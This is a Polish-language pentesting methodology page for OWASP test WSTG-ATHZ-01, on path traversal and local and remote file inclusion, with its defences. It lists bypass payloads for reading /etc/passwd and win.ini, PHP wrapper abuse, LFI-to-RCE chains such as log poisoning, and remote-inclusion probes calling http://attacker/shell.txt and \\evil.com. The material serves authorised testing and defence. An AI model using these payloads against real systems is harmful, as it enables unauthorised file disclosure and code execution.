# WSTG-ATHZ-01 — Testing Directory Traversal File Include

## Cel

Wykrycie path traversal i file inclusion (LFI/RFI) - klasyczny pivot z dostępu do plików konfiguracyjnych (`/etc/passwd`, `web.config`) do RCE (PHP wrappery, log poisoning, session file inclusion).

> **Cross-ref**: główne pokrycie w **WSTG-INPV-11** (LFI/RFI) — ten test (ATHZ-01) skupia się na perspektywie autoryzacji (czy użytkownik powinien mieć dostęp do tego pliku?).

## Automatyzacja Nuclei

```bash
# Pełna automatyzacja w INPV-11 (LFI/RFI)
nuclei -l burp-export.xml -im burp -t templates/wstg-inpv-11-lfi-rfi.yaml

# Również attack-surface (wykrywa source control / config exposure)
nuclei -l burp-export.xml -im burp -t templates/wstg-info-04-attack-surface.yaml
```

## Standard pentesterski — jak to robi się wzorowo

### Metodologia (5 kroków)

1. **Identify file inclusion params**: `?file=`, `?page=`, `?include=`, `?template=`, `?path=`.
2. **Path traversal probe**: `../../../etc/passwd`, encoding variants, null byte (legacy PHP).
3. **PHP wrappers**: `php://filter/convert.base64-encode/resource=index.php` (source disclosure), `expect://`, `data://` (RCE).
4. **RFI test**: `?file=http://attacker/shell.txt` jeśli `allow_url_include=On`.
5. **Log poisoning**: jeśli LFI works, próbować inclusion logu apache + injection XSS przez User-Agent → RCE.

### Co MUSI być sprawdzone (10 punktów)

- [ ] `../../../etc/passwd` — Linux file read
- [ ] `..\..\..\windows\win.ini` — Windows
- [ ] URL encoding `%2e%2e%2f` 
- [ ] Double encoding `%252e%252e%252f`
- [ ] Null byte `%00`
- [ ] PHP wrappers (`php://filter/`, `expect://`, `data:`)
- [ ] RFI z `http://attacker/shell.txt`
- [ ] Log poisoning chain
- [ ] Authorization check: czy authenticated user może czytać cudze pliki?
- [ ] /proc/self/environ inclusion (sometimes RCE)

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Input_Validation_Cheat_Sheet.md, File_Upload_Cheat_Sheet.md

### Path Traversal — mechanizm ataku

- Atakujący manipuluje ścieżką pliku aby uzyskać dostęp do plików poza zamierzonym katalogiem
- Podstawowy payload: `../../../etc/passwd` — przechodzenie do katalogu nadrzędnego
- Cel: odczyt plików konfiguracyjnych, kodów źródłowych, credentials, kluczy prywatnych
- W połączeniu z LFI (Local File Inclusion): możliwe **zdalne wykonanie kodu** (RCE)

### Techniki bypass filtrów

| Technika | Payload | Opis |
|----------|---------|------|
| Podwójne ../  | `....//....//etc/passwd` | Filtr usuwa `../` raz, zostaje `../` |
| URL encoding | `%2e%2e%2f` | Dekodowanie po walidacji |
| Double encoding | `%252e%252e%252f` | Podwójne dekodowanie |
| Null byte | `../../../etc/passwd%00.jpg` | PHP < 5.3.4 obcina po null byte |
| Backslash (Windows) | `..\..\..\..\windows\win.ini` | Windows path separator |
| UNC path | `\\evil.com\share\file` | Dostęp do zdalnych zasobów |
| UTF-8 encoding | `..%c0%af..%c0%af` | Overlong UTF-8 encoding |

### Obrona — wielowarstwowa

- **Avoid file paths from user input**: użyj indirect references (mapping ID → file)
- **Allowlist** dozwolonych plików — denylist niewystarczający
- **Walidacja path normalizacji**: `realpath()` w PHP, `Path.GetFullPath()` w .NET → sprawdź że result jest w expected directory
- **Chroot/jail** procesu webowego — nie pozwól na dostęp poza document root
- **File permissions**: web user (www-data) nie powinien mieć dostępu do `/etc/`, `/root/`, etc.

### LFI to RCE — chains

- **Log poisoning**: LFI + log file inclusion + User-Agent z `<?php` → RCE
- **Session file inclusion**: PHP session w `/tmp/sess_*` z PHP code → RCE
- **PHP wrappers**: `php://filter` (source), `expect://` (RCE), `data://` (RCE)
- **/proc/self/environ**: User-Agent reflectowane w env vars → RCE w starszych systemach

## Pentesterskie deep dive

### Mniej znane techniki

- **Authorization aspect of path traversal**: nawet jeśli aplikacja blokuje `../etc/passwd`, czy authenticated user może czytać user_B's files (`?file=user_B/private.pdf`)? IDOR + path traversal hybrid.
- **PHP filter chain (CVE-2023-...)**: chain `php://filter/convert.base64-decode|...|...` może evade restrictions.
- **Race condition w file upload + traversal**: upload + symlink traversal.

### Common pitfalls

- **realpath() bez verification że jest w allowed dir**: realpath canonicalizes ale nie waliduje location.
- **Allowlist on filename only, not path**: `getFile("config.php")` ignoruje że path zawiera `../`.

### Świeżynki z research

- **PortSwigger Path Traversal Lab**: https://portswigger.net/web-security/file-path-traversal
- **HackTricks LFI**: https://book.hacktricks.xyz/pentesting-web/file-inclusion

## Rozszerzenia Burp Suite

| Rozszerzenie | Opis |
|---|---|
| Param Miner | Hidden file params discovery |

## Źródła

- WSTG: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include
- OWASP Input Validation CS: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
- HackTricks LFI: https://book.hacktricks.xyz/pentesting-web/file-inclusion

### Wskazówki ASVS

| ID | Wymaganie |
|---|---|
| V12.3.1 | File path validation against canonicalization. |
| V5.3.10 | LFI defense via allowlists. |
